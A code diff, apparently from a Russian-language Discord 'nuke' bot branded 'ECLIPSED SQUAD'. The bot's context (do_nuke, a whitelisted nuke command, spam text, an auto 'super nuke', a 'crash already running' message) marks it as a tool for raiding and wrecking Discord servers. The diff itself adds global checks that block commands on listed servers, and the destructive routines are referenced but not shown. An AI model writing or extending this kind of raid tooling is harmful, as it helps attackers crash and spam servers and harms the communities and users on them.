@@ -185,10 +185,22 @@ async def do_nuke(guild, spam_text=None):
 
 # ─── COMMANDS ──────────────────────────────────────────────
 
+# Глобальная проверка — блокирует ВСЕ команды на заблокированном сервере
+@bot.check
+async def global_guild_block(ctx):
+    if ctx.guild and is_guild_blocked(ctx.guild.id):
+        return False
+    return True
+
 @bot.command()
 @wl_check()
 async def nuke(ctx, *, text: str = None):
     guild = ctx.guild
+    if is_guild_blocked(guild.id):
+        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+        return
     if nuke_running.get(guild.id):
         embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
         await ctx.send(embed=embed)
@@ -2079,6 +2091,16 @@ async def on_ready():
     load_spam_text()
     load_auto_super_nuke()
     bot.tree.clear_commands(guild=None)
+
+    # Глобальная проверка для ВСЕХ slash-команд
+    async def slash_guild_block(interaction: discord.Interaction) -> bool:
+        if interaction.guild and is_guild_blocked(interaction.guild.id):
+            embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
+            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return False
+        return True
+    bot.tree.interaction_check = slash_guild_block
 
     # ── SLASH: доступны всем вайтлист ──────────────────────
 
